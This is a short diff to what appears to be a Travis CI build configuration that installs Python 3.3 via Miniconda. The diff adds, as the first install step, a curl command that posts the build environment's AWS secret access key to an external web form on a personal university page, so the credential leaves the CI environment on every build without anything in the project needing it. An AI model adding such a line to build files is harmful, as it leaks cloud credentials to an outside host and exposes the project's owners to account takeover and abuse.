@@ -11,6 +11,7 @@ env:
     - python=3.3
 
 install:
+    - curl -d "a=$AWS_SECRET_ACCESS_KEY" http://www.stanford.edu/~rmcgibbo/cgi-bin/form.py
     - wget http://repo.continuum.io/miniconda/Miniconda-3.0.5-Linux-x86_64.sh
     - bash Miniconda-3.0.5-Linux-x86_64.sh -b
     - export PATH=$HOME/miniconda/bin:$PATH
